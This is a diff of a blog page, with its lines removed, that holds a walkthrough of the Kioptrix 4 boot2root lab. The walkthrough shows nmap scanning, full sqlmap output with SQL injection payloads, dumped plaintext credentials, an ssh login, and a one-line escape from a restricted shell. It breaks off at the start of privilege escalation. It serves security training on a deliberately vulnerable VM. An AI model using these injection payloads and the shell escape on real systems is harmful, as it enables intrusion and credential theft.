@@ -91,621 +91,520 @@
 		<div style='clear: both;'></div>
 	</div>
 	
+	<div style='clear: both;'></div>
+	<div id="outer-wrapper" class="index home">
 
-<div id="main">
-  <div id="content">
-    <div>
-      <article class="hentry" role="article">
+<div class='row' id='content-wrapper'>
+    <div id='main-wrapper'>
+      <div class='main section' id='main'>
+      
+
 
         
-        
 
-        <div class="entry-content">
-          
-          
-          
-          <p>I know there are a few different methods to the new <a href="http://www.kioptrix.com/blog/?p=604">Kioptrix 4</a> boot2root.  Unfortunately, I could not find the remote root exploit that is mentioned, but my method used several tools, and privilege escalation.</p>
 
-<!-- more -->
-
-<p>Tools used:</p>
-
-<ul>
-<li><a href="http://www.backtrack-linux.org">Backtrack 5 VM</a></li>
-<li><a href="http://nmap.org">Nmap</a></li>
-<li><a href="http://sqlmap.org">SqlMap</a></li>
-</ul>
-
-<p>To start out, I had to find the machine on the network.  I booted up my Backtrack VM and Kioptrix VM both using a NAT connection in my VMWare.  This would put them on the same internal network.  In BackTrack, I first found my IP address:</p>
-
-<pre><code>root@bt:~# ifconfig
-eth1      Link encap:Ethernet  HWaddr 00:0c:29:96:92:1e  
-          inet addr:192.168.95.136  Bcast:192.168.95.255  Mask:255.255.255.0
-          inet6 addr: fe80::20c:29ff:fe96:921e/64 Scope:Link
-          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
-          RX packets:57480 errors:44807 dropped:0 overruns:0 frame:0
-          TX packets:193847 errors:0 dropped:0 overruns:0 carrier:0
-          collisions:0 txqueuelen:1000 
-          RX bytes:14079464 (14.0 MB)  TX bytes:14077265 (14.0 MB)
-          Interrupt:19 Base address:0x2024 
-
-lo        Link encap:Local Loopback  
-          inet addr:127.0.0.1  Mask:255.0.0.0
-          inet6 addr: ::1/128 Scope:Host
-          UP LOOPBACK RUNNING  MTU:16436  Metric:1
-          RX packets:136257 errors:0 dropped:0 overruns:0 frame:0
-          TX packets:136257 errors:0 dropped:0 overruns:0 carrier:0
-          collisions:0 txqueuelen:0 
-          RX bytes:26029235 (26.0 MB)  TX bytes:26029235 (26.0 MB)
-</code></pre>
-
-<p>Using this information, I scanned the subnet for other devices:</p>
-
-<pre><code>root@bt:~# netdiscover -r 192.168.95.0/24
-
- Currently scanning: Finished!   |   Screen View: Unique Hosts                 
-                                                                               
- 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
- _____________________________________________________________________________
-   IP            At MAC Address      Count  Len   MAC Vendor                   
- ----------------------------------------------------------------------------- 
- 192.168.95.1    00:50:56:c0:00:08    01    060   VMWare, Inc.                 
- 192.168.95.2    00:50:56:f1:ea:a0    01    060   VMWare, Inc.                 
- 192.168.95.131  00:0c:29:03:da:8f    01    060   VMware, Inc.                 
- 192.168.95.254  00:50:56:fb:ac:b6    01    060   VMWare, Inc.  
-</code></pre>
-
-<p>I figured out of that list, that 1, 2, and 254 were reserved ones, and that 192.168.95.131 would be my Kioptrix VM.  So I did a port scan.</p>
-
-<pre><code>root@bt:~# nmap -sV 192.168.95.131
-
-Starting Nmap 5.61TEST4 ( http://nmap.org ) at 2012-02-12 14:03 EST
-Nmap scan report for 192.168.95.131
-Host is up (0.00011s latency).
-Not shown: 566 closed ports, 430 filtered ports
-PORT    STATE SERVICE     VERSION
-22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
-80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
-139/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
-445/tcp open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
-MAC Address: 00:0C:29:03:DA:8F (VMware)
-Service Info: OS: Linux; CPE: cpe:/o:linux:kernel
-
-Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 26.42 seconds
-</code></pre>
-
-<p>I started to poke around.  Since HTTP is often times the easiest for me, I started there.  I went to http://<nolink>192.168.95.131 and was presented with a basic login screen (and a cute goat).  I attempted to use the username of &ldquo;admin&rdquo;, with the same password, &ldquo;admin&rdquo;.  It redirected me to a password failure page, located at http://<nolink>192.168.95.131/checklogin.php.  I used the Firefox extension, Tamper Data, to double-check the POST query-string.  It showed, &ldquo;myusername=admin&amp;mypassword=admin&amp;Submit=Login&rdquo;.</p>
-
-<p>My instincts told me that I should attempt some sql injection on these login screens.  I tinkered with some of the basic ones I remembered off the top of my head, but none of them worked.  It did show promise though, as I received several errors in the process.  This meant it was time for the big guns.</p>
-
-<p>SqlMap is a tool that I&rsquo;m not super familiar with, but will definitely be learning more about.  It&rsquo;s very powerful, even in the hand of a beginner.  I used the url that I posted to, and specified a few options, and just watched it go:</p>
-
-<pre><code>root@bt:/pentest/database/sqlmap# ./sqlmap.py -u http://192.168.95.131/checklogin.php --data=&quot;myusername=admin&amp;mypassword=admin&amp;Submit=Login&quot; --level=5 --risk=3 --dbs
-
-    sqlmap/1.0-dev (r4739) - automatic SQL injection and database takeover tool
-    http://www.sqlmap.org
-
-[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting at 20:42:28
-
-[20:42:28] [INFO] using '/pentest/database/sqlmap/output/192.168.95.131/session' as session file
-[20:42:28] [INFO] testing connection to the target url
-[20:42:28] [INFO] heuristics detected web page charset 'ascii'
-[20:42:28] [INFO] testing if the url is stable, wait a few seconds
-[20:42:29] [INFO] url is stable
-[20:42:29] [INFO] testing if POST parameter 'myusername' is dynamic
-[20:42:29] [WARNING] POST parameter 'myusername' appears to be not dynamic
-[20:42:29] [WARNING] heuristic test shows that POST parameter 'myusername' might not be injectable
-[20:42:29] [INFO] testing sql injection on POST parameter 'myusername'
-[20:42:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[20:42:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
-[20:42:30] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Generic comment)'
-[20:42:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
-[20:42:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
-[20:42:32] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Generic comment)'
-[20:42:32] [INFO] testing 'MySQL boolean-based blind - WHERE or HAVING clause (RLIKE)'
-[20:42:32] [INFO] testing 'Generic boolean-based blind - Parameter replace (original value)'
-[20:42:32] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
-[20:42:32] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
-[20:42:32] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
-[20:42:32] [INFO] testing 'MySQL &gt;= 5.0 boolean-based blind - Parameter replace (original value)'
-[20:42:32] [INFO] testing 'MySQL &lt; 5.0 boolean-based blind - Parameter replace (original value)'
-[20:42:32] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
-[20:42:32] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
-[20:42:32] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
-[20:42:33] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
-[20:42:33] [INFO] testing 'SAP MaxDB boolean-based blind - Parameter replace (original value)'
-[20:42:33] [INFO] testing 'Generic boolean-based blind - GROUP BY and ORDER BY clauses'
-[20:42:33] [INFO] testing 'Generic boolean-based blind - GROUP BY and ORDER BY clauses (original value)'
-[20:42:33] [INFO] testing 'MySQL &gt;= 5.0 boolean-based blind - GROUP BY and ORDER BY clauses'
-[20:42:33] [INFO] testing 'MySQL &lt; 5.0 boolean-based blind - GROUP BY and ORDER BY clauses'
-[20:42:33] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
-[20:42:33] [INFO] testing 'Oracle boolean-based blind - GROUP BY and ORDER BY clauses'
-[20:42:33] [INFO] testing 'Microsoft Access boolean-based blind - GROUP BY and ORDER BY clauses'
-[20:42:33] [INFO] testing 'MySQL stacked conditional-error blind queries'
-[20:42:33] [INFO] testing 'PostgreSQL stacked conditional-error blind queries'
-[20:42:33] [INFO] testing 'Microsoft SQL Server/Sybase stacked conditional-error blind queries'
-[20:42:34] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause'
-[20:42:34] [INFO] testing 'MySQL &gt;= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)'
-[20:42:34] [INFO] testing 'MySQL &gt;= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)'
-[20:42:34] [INFO] testing 'MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause'
-[20:42:35] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
-[20:42:35] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause'
-[20:42:35] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
-[20:42:35] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
-[20:42:35] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (utl_inaddr.get_host_address)'
-[20:42:35] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (ctxsys.drithsx.sn)'
-[20:42:35] [INFO] testing 'Firebird AND error-based - WHERE or HAVING clause'
-[20:42:36] [INFO] testing 'MySQL &gt;= 5.0 OR error-based - WHERE or HAVING clause'
-[20:42:36] [INFO] testing 'MySQL &gt;= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)'
-[20:42:36] [INFO] testing 'MySQL &gt;= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)'
-[20:42:36] [INFO] testing 'MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause'
-[20:42:36] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause'
-[20:42:36] [INFO] testing 'PostgreSQL OR error-based - WHERE or HAVING clause'
-[20:42:37] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause'
-[20:42:37] [INFO] testing 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)'
-[20:42:37] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (XMLType)'
-[20:42:37] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (utl_inaddr.get_host_address)'
-[20:42:38] [INFO] testing 'Oracle OR error-based - WHERE or HAVING clause (ctxsys.drithsx.sn)'
-[20:42:38] [INFO] testing 'Firebird OR error-based - WHERE or HAVING clause'
-[20:42:38] [INFO] testing 'MySQL &gt;= 5.0 error-based - Parameter replace'
-[20:42:38] [INFO] testing 'MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
-[20:42:38] [INFO] testing 'MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)'
-[20:42:38] [INFO] testing 'PostgreSQL error-based - Parameter replace'
-[20:42:38] [INFO] testing 'Microsoft SQL Server/Sybase error-based - Parameter replace'
-[20:42:38] [INFO] testing 'Oracle error-based - Parameter replace'
-[20:42:38] [INFO] testing 'Firebird error-based - Parameter replace'
-[20:42:38] [INFO] testing 'MySQL &gt;= 5.0 error-based - GROUP BY and ORDER BY clauses'
-[20:42:38] [INFO] testing 'MySQL &gt;= 5.1 error-based - GROUP BY and ORDER BY clauses (EXTRACTVALUE)'
-[20:42:38] [INFO] testing 'MySQL &gt;= 5.1 error-based - GROUP BY and ORDER BY clauses (UPDATEXML)'
-[20:42:38] [INFO] testing 'PostgreSQL error-based - GROUP BY and ORDER BY clauses'
-[20:42:38] [INFO] testing 'Microsoft SQL Server/Sybase error-based - ORDER BY clause'
-[20:42:38] [INFO] testing 'Oracle error-based - GROUP BY and ORDER BY clauses'
-[20:42:38] [INFO] testing 'MySQL &gt; 5.0.11 stacked queries'
-[20:42:38] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (heavy query)'
-[20:42:38] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries'
-[20:42:39] [INFO] testing 'PostgreSQL stacked queries (heavy query)'
-[20:42:39] [INFO] testing 'PostgreSQL &lt; 8.2 stacked queries (Glibc)'
-[20:42:39] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries'
-[20:42:39] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE)'
-[20:42:39] [INFO] testing 'Oracle stacked queries (heavy query)'
-[20:42:39] [INFO] testing 'Oracle stacked queries (DBMS_LOCK.SLEEP)'
-[20:42:39] [INFO] testing 'Oracle stacked queries (USER_LOCK.SLEEP)'
-[20:42:40] [INFO] testing 'SQLite &gt; 2.0 stacked queries (heavy query)'
-[20:42:40] [INFO] testing 'Firebird stacked queries (heavy query)'
-[20:42:40] [INFO] testing 'MySQL &gt; 5.0.11 AND time-based blind'
-[20:42:40] [INFO] testing 'MySQL &gt; 5.0.11 AND time-based blind (comment)'
-[20:42:40] [INFO] testing 'MySQL &lt; 5.0.12 AND time-based blind (heavy query)'
-[20:42:40] [INFO] testing 'MySQL &lt; 5.0.12 AND time-based blind (heavy query - comment)'
-[20:42:40] [INFO] testing 'PostgreSQL &gt; 8.1 AND time-based blind'
-[20:42:41] [INFO] testing 'PostgreSQL &gt; 8.1 AND time-based blind (comment)'
-[20:42:41] [INFO] testing 'PostgreSQL AND time-based blind (heavy query)'
-[20:42:41] [INFO] testing 'PostgreSQL AND time-based blind (heavy query - comment)'
-[20:42:41] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind'
-[20:42:41] [INFO] POST parameter 'myusername' is 'Microsoft SQL Server/Sybase time-based blind' injectable 
-[20:42:41] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
-[20:42:41] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
-[20:42:41] [INFO] testing 'MySQL UNION query (NULL) - 11 to 20 columns'
-[20:42:41] [INFO] testing 'MySQL UNION query (random number) - 11 to 20 columns'
-[20:42:41] [INFO] testing 'MySQL UNION query (NULL) - 21 to 30 columns'
-[20:42:41] [INFO] testing 'MySQL UNION query (random number) - 21 to 30 columns'
-[20:42:41] [INFO] testing 'MySQL UNION query (NULL) - 31 to 40 columns'
-[20:42:41] [INFO] testing 'MySQL UNION query (random number) - 31 to 40 columns'
-[20:42:41] [INFO] testing 'MySQL UNION query (NULL) - 41 to 50 columns'
-[20:42:41] [INFO] testing 'MySQL UNION query (random number) - 41 to 50 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (NULL) - 11 to 20 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (random number) - 11 to 20 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (NULL) - 21 to 30 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (random number) - 21 to 30 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (NULL) - 31 to 40 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (random number) - 31 to 40 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (NULL) - 41 to 50 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (random number) - 41 to 50 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (NUL comment) (NULL) - 1 to 10 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (NUL comment) (random number) - 1 to 10 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (NUL comment) (NULL) - 11 to 20 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (NUL comment) (random number) - 11 to 20 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (NUL comment) (NULL) - 21 to 30 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (NUL comment) (random number) - 21 to 30 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (NUL comment) (NULL) - 31 to 40 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (NUL comment) (random number) - 31 to 40 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (NUL comment) (NULL) - 41 to 50 columns'
-[20:42:42] [INFO] testing 'Generic UNION query (NUL comment) (random number) - 41 to 50 columns'
-[20:42:43] [INFO] checking if the injection point on POST parameter 'myusername' is a false positive
-[20:42:43] [WARNING] false positive injection point detected
-[20:42:43] [WARNING] POST parameter 'myusername' is not injectable
-[20:42:43] [INFO] testing if POST parameter 'mypassword' is dynamic
-[20:42:43] [WARNING] POST parameter 'mypassword' appears to be not dynamic
-[20:42:43] [INFO] heuristic test shows that POST parameter 'mypassword' might be injectable (possible DBMS: MySQL)
-[20:42:43] [INFO] testing sql injection on POST parameter 'mypassword'
-[20:42:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-sqlmap got a 302 redirect to 'http://192.168.95.131:80/login_success.php'. What do you want to do? 
-[1] Follow the redirection (default)
-[2] Stay on the original page
-[3] Ignore
-&gt; 2
-[20:42:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Generic comment)'
-[20:42:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
-[20:42:51] [INFO] POST parameter 'mypassword' is 'OR boolean-based blind - WHERE or HAVING clause' injectable 
-[20:42:51] [INFO] testing 'MySQL &gt;= 5.0 AND error-based - WHERE or HAVING clause'
-[20:42:51] [INFO] testing 'MySQL &gt;= 5.1 AND error-based - WHERE or HAVING clause (EXTRACTVALUE)'
-[20:42:51] [INFO] testing 'MySQL &gt;= 5.1 AND error-based - WHERE or HAVING clause (UPDATEXML)'
-[20:42:51] [INFO] testing 'MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause'
-[20:42:51] [INFO] testing 'MySQL &gt;= 5.0 OR error-based - WHERE or HAVING clause'
-[20:42:51] [INFO] testing 'MySQL &gt;= 5.1 OR error-based - WHERE or HAVING clause (EXTRACTVALUE)'
-[20:42:51] [INFO] testing 'MySQL &gt;= 5.1 OR error-based - WHERE or HAVING clause (UPDATEXML)'
-[20:42:51] [INFO] testing 'MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause'
-[20:42:51] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause'
-[20:42:51] [INFO] testing 'MySQL &gt;= 5.0 error-based - Parameter replace'
-[20:42:51] [INFO] testing 'MySQL &gt;= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
-[20:42:51] [INFO] testing 'MySQL &gt;= 5.1 error-based - Parameter replace (UPDATEXML)'
-[20:42:51] [INFO] testing 'MySQL &gt; 5.0.11 stacked queries'
-[20:42:51] [INFO] testing 'MySQL &lt; 5.0.12 stacked queries (heavy query)'
-[20:42:51] [INFO] testing 'MySQL &gt; 5.0.11 AND time-based blind'
-[20:42:51] [INFO] testing 'MySQL &gt; 5.0.11 AND time-based blind (comment)'
-[20:42:51] [INFO] testing 'MySQL &lt; 5.0.12 AND time-based blind (heavy query)'
-[20:43:03] [INFO] POST parameter 'mypassword' is 'MySQL &lt; 5.0.12 AND time-based blind (heavy query)' injectable 
-[20:43:03] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
-[20:43:03] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for UNION query injection technique
-[20:43:03] [INFO] target url appears to have 3 columns in query
-[20:43:04] [WARNING] if UNION based SQL injection is not detected, please consider usage of option '--union-char' (e.g. --union-char=1) and/or try to force the back-end DBMS (e.g. --dbms=mysql) 
-[20:43:04] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
-[20:43:04] [INFO] testing 'MySQL UNION query (NULL) - 11 to 20 columns'
-[20:43:04] [INFO] testing 'MySQL UNION query (random number) - 11 to 20 columns'
-[20:43:04] [INFO] testing 'MySQL UNION query (NULL) - 21 to 30 columns'
-[20:43:04] [INFO] testing 'MySQL UNION query (random number) - 21 to 30 columns'
-[20:43:04] [INFO] testing 'MySQL UNION query (NULL) - 31 to 40 columns'
-[20:43:04] [INFO] testing 'MySQL UNION query (random number) - 31 to 40 columns'
-[20:43:04] [INFO] testing 'MySQL UNION query (NULL) - 41 to 50 columns'
-[20:43:04] [INFO] testing 'MySQL UNION query (random number) - 41 to 50 columns'
-[20:43:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
-[20:43:04] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
-[20:43:04] [INFO] testing 'Generic UNION query (NULL) - 11 to 20 columns'
-[20:43:04] [INFO] testing 'Generic UNION query (random number) - 11 to 20 columns'
-[20:43:04] [INFO] testing 'Generic UNION query (NULL) - 21 to 30 columns'
-[20:43:04] [INFO] testing 'Generic UNION query (random number) - 21 to 30 columns'
-[20:43:05] [INFO] testing 'Generic UNION query (NULL) - 31 to 40 columns'
-[20:43:05] [INFO] testing 'Generic UNION query (random number) - 31 to 40 columns'
-[20:43:05] [INFO] testing 'Generic UNION query (NULL) - 41 to 50 columns'
-[20:43:05] [INFO] testing 'Generic UNION query (random number) - 41 to 50 columns'
-[20:43:05] [INFO] testing 'Generic UNION query (NUL comment) (NULL) - 1 to 10 columns'
-[20:43:05] [INFO] testing 'Generic UNION query (NUL comment) (random number) - 1 to 10 columns'
-[20:43:05] [INFO] testing 'Generic UNION query (NUL comment) (NULL) - 11 to 20 columns'
-[20:43:05] [INFO] testing 'Generic UNION query (NUL comment) (random number) - 11 to 20 columns'
-[20:43:05] [INFO] testing 'Generic UNION query (NUL comment) (NULL) - 21 to 30 columns'
-[20:43:05] [INFO] testing 'Generic UNION query (NUL comment) (random number) - 21 to 30 columns'
-[20:43:05] [INFO] testing 'Generic UNION query (NUL comment) (NULL) - 31 to 40 columns'
-[20:43:05] [INFO] testing 'Generic UNION query (NUL comment) (random number) - 31 to 40 columns'
-[20:43:05] [INFO] testing 'Generic UNION query (NUL comment) (NULL) - 41 to 50 columns'
-[20:43:05] [INFO] testing 'Generic UNION query (NUL comment) (random number) - 41 to 50 columns'
-[20:43:05] [WARNING] in OR boolean-based injections, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
-POST parameter 'mypassword' is vulnerable. Do you want to keep testing the others? [Y/n] n
-sqlmap identified the following injection points with a total of 3697 HTTP(s) requests:
----
-Place: POST
-Parameter: mypassword
-    Type: boolean-based blind
-    Title: OR boolean-based blind - WHERE or HAVING clause
-    Payload: myusername=admin&amp;mypassword=-5618' OR NOT (5039=5039) AND 'Gndx'='Gndx&amp;Submit=Login
-
-    Type: AND/OR time-based blind
-    Title: MySQL &lt; 5.0.12 AND time-based blind (heavy query)
-    Payload: myusername=admin&amp;mypassword=admin' AND 9312=BENCHMARK(5000000,MD5(0x57485477)) AND 'lxSR'='lxSR&amp;Submit=Login
----
-
-[20:43:11] [INFO] testing MySQL
-[20:43:11] [INFO] confirming MySQL
-[20:43:11] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
-web application technology: PHP 5.2.4, Apache 2.2.8
-back-end DBMS: MySQL &gt;= 5.0.0
-[20:43:11] [INFO] fetching database names
-[20:43:11] [INFO] fetching number of databases
-[20:43:11] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
-[20:43:11] [INFO] retrieved: 3
-[20:43:11] [INFO] retrieved: information_schema
-[20:43:12] [INFO] retrieved: members
-[20:43:13] [INFO] retrieved: mysql
-available databases [3]:
-[*] information_schema
-[*] members
-[*] mysql
-
-[20:43:13] [INFO] Fetched data logged to text files under '/pentest/database/sqlmap/output/192.168.95.131'
-
-[*] shutting down at 20:43:13
-</code></pre>
-
-<p>During this run, you can see that it prompted me only 2 times.  Once because it was redirected, and asked if I wanted to stay on the same page or follow the redirect.  Another because it found that &ldquo;mypassword&rdquo; was injectable, and wanted to know if I wanted to try some others.  I didn&rsquo;t care about any other pages, or any other variables if the first one worked.</p>
-
-<p>This gave me 3 MySQL databases, &ldquo;information_schema&rdquo;, &ldquo;mysql&rdquo;, and &ldquo;members&rdquo;.  The first two are default in MySQL installations, but the last probably has to do with the Kioptrix VM.  So I decided to go further with the &ldquo;members&rdquo; database.  I opted to dump all the data in the &ldquo;members&rdquo; database.</p>
-
-<pre><code>root@bt:/pentest/database/sqlmap# ./sqlmap.py -u http://192.168.95.131/checklogin.php --data=&quot;myusername=admin&amp;mypassword=admin&amp;Submit=Login&quot; --level=5 --risk=3 -D members --dump
-
-    sqlmap/1.0-dev (r4739) - automatic SQL injection and database takeover tool
-    http://www.sqlmap.org
-
-[!] legal disclaimer: usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Authors assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting at 20:48:45
-
-[20:48:46] [INFO] using '/pentest/database/sqlmap/output/192.168.95.131/session' as session file
-[20:48:46] [INFO] resuming injection data from session file
-[20:48:46] [INFO] resuming back-end DBMS 'mysql 5' from session file
-[20:48:46] [INFO] testing connection to the target url
-[20:48:46] [INFO] heuristics detected web page charset 'ascii'
-sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
----
-Place: POST
-Parameter: mypassword
-    Type: boolean-based blind
-    Title: OR boolean-based blind - WHERE or HAVING clause
-    Payload: myusername=admin&amp;mypassword=-5618' OR NOT (5039=5039) AND 'Gndx'='Gndx&amp;Submit=Login
-
-    Type: AND/OR time-based blind
-    Title: MySQL &lt; 5.0.12 AND time-based blind (heavy query)
-    Payload: myusername=admin&amp;mypassword=admin' AND 9312=BENCHMARK(5000000,MD5(0x57485477)) AND 'lxSR'='lxSR&amp;Submit=Login
----
-
-[20:48:46] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
-web application technology: PHP 5.2.4, Apache 2.2.8
-back-end DBMS: MySQL 5
-[20:48:46] [INFO] fetching tables for database: members
-[20:48:46] [INFO] fetching number of tables for database 'members'
-[20:48:46] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
-sqlmap got a 302 redirect to 'http://192.168.95.131:80/login_success.php'. What do you want to do? 
-[1] Follow the redirection (default)
-[2] Stay on the original page
-[3] Ignore
-&gt; 2
-1
-[20:48:48] [INFO] retrieved: members
-[20:48:48] [INFO] fetching columns for table 'members' on database 'members'
-[20:48:48] [INFO] retrieved: 3
-[20:48:48] [INFO] retrieved: id
-[20:48:49] [INFO] retrieved: username
-[20:48:49] [INFO] retrieved: password
-[20:48:50] [INFO] fetching entries for table 'members' on database 'members'
-[20:48:50] [INFO] fetching number of entries for table 'members' on database 'members'
-[20:48:50] [INFO] retrieved: 2
-[20:48:50] [INFO] retrieved: 1
-[20:48:50] [INFO] retrieved: MyNameIsJohn
-[20:48:51] [INFO] retrieved: john
-[20:48:51] [INFO] retrieved: 2
-[20:48:51] [INFO] retrieved: ADGAdsafdfwt4gadfga==
-[20:48:52] [INFO] retrieved: robert
-[20:48:52] [INFO] analyzing table dump for possible password hashes
-Database: members
-Table: members
-[2 entries]
-+----+-----------------------+----------+
-| id | password              | username |
-+----+-----------------------+----------+
-| 1  | MyNameIsJohn          | john     |
-| 2  | ADGAdsafdfwt4gadfga== | robert   |
-+----+-----------------------+----------+
-
-[20:48:52] [INFO] Table 'members.members' dumped to CSV file '/pentest/database/sqlmap/output/192.168.95.131/dump/members/members.csv'
-[20:48:52] [INFO] Fetched data logged to text files under '/pentest/database/sqlmap/output/192.168.95.131'
-
-[*] shutting down at 20:48:52
-</code></pre>
-
-<p>So there we have some credentials!  When I tried these on the login page, both of them worked!  However, it was a dead end, as it just showed me the usernames and passwords that I just entered.</p>
-
-<p>On a whim, I tried using the first login to ssh in, and it worked!</p>
-
-<pre><code>root@bt:/pentest/database/sqlmap# ssh john@192.168.95.131
-john@192.168.95.131's password: 
-Welcome to LigGoat Security Systems - We are Watching
-== Welcome LigGoat Employee ==
-LigGoat Shell is in place so you  don't screw up
-Type '?' or 'help' to get the list of allowed commands
-john:~$ 
-</code></pre>
-
-<p>So I guess that was good news.  However the bad news was that it was in a form of a restricted shell.  I was not familiar with the &ldquo;LigGoat Shell&rdquo;.  However, it seemed somewhat limiting.  It only allowed the commands of, &ldquo;cd&rdquo;, &ldquo;clear&rdquo;, &ldquo;echo&rdquo;, &ldquo;exit&rdquo;, &ldquo;help&rdquo;, &ldquo;ll&rdquo;, &ldquo;lpath&rdquo;, and &ldquo;ls&rdquo;.  Like most other restricted shells that I&rsquo;ve ran into in the past, it would not let you pipe things, or access items outside your folder.  So if you did a &ldquo;ls ../&rdquo;, it would not work.  However, unlike other shells, this one would actually disconnect you after a single warning of violating these rules!  Luckily, in my searching for methods to break out of a restricted shell, I found a great article on my buddy, g0tmi1k&rsquo;s site, <a href="http://g0tmi1k.blogspot.com/2011/08/basic-linux-privilege-escalation.html">here</a>.</p>
-
-<pre><code>john:~$ echo os.system('/bin/bash')
-john@Kioptrix4:~$ 
-</code></pre>
-
-<p>I now had an unrestricted bash shell.  I was still limited to the &ldquo;john&rdquo; user, which seemed to have normal user privileges.  The next step was to escalate to root privileges.  I started with looking at what was running.</p>
-
-<pre><code>john@Kioptrix4:~$ ps aux
-USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
-root         1  0.0  0.1   2844  1696 ?        Ss   Feb11   0:01 /sbin/init
-root         2  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [kthreadd]
-root         3  0.0  0.0      0     0 ?        S&lt;   Feb11   0:00 [migration/0]
